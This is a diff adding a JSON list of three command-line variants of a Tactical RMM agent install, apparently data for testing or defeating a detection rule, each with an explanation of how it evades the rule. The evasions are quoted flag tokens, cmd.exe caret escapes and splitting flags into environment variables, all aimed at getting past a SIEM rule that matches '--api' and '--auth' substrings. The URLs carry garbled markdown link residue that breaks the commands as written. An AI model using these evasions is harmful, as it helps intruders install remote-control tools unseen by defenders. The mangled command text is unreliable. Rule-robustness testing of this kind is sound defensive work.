@@ -1,0 +1,14 @@
+[
+{
+"output": "C:\TacticalAgent\tacticalrmm.exe "--api" "[https://api.example.com](https://www.google.com/search?q=https://api.example.com)" "--auth" "secret123" "--client-id" "1" "--site-id" "1" "--agent-type" "server"",
+"explanation": "Insertion technique: Individual token strings for flags are isolated and wrapped inside double quotes. The rule utilizes the 'CommandLine|contains|all' logic block to find exact matches for unquoted character literal configurations like '--api' and '--auth'. Adding quotation boundaries alters the character layout recorded by raw security event parameters (e.g., logging '"--api"' instead of '--api'), safely breaking the rule patterns while the standard Windows argument handler normalizes the strings identically during binary execution."
+},
+{
+"output": "cmd.exe /c "C:\TacticalAgent\tacticalrmm.exe --ap^i [https://api.example.com](https://www.google.com/search?q=https://api.example.com) --au^th secret123 --client-^id 1 --site-^id 1 --agent-t^ype server"",
+"explanation": "Insertion technique: Injects the standard command prompt caret escape character ('^') directly within the monitored payload parameters. When wrapped inside a cmd.exe context execution string, the command interpreter parses and cleans out the carets prior to starting the tacticalrmm child process. The raw telemetry logged for the event retains the character insertions verbatim, preventing successful keyword evaluation against the strict substring criteria."
+},
+{
+"output": "cmd.exe /c "set "P1=--api" && set "P2=--auth" && set "P3=--client-id" && C:\TacticalAgent\tacticalrmm.exe %P1% [https://api.example.com](https://www.google.com/search?q=https://api.example.com) %P2% secret123 %P3% 1 --site-id 1 --agent-type server"",
+"explanation": "Recoding / Environment Variables technique: Declares separate local environment variable handles to host a subset of the critical pattern tokens before executing the application target block. Since SIEM log parsing for the rule evaluates the initial string containment literally rather than running runtime shell variable expansion, splitting the mandatory substrings breaks the combined detection check while delivering the complete expected string properties to the tool environment."
+}
+]
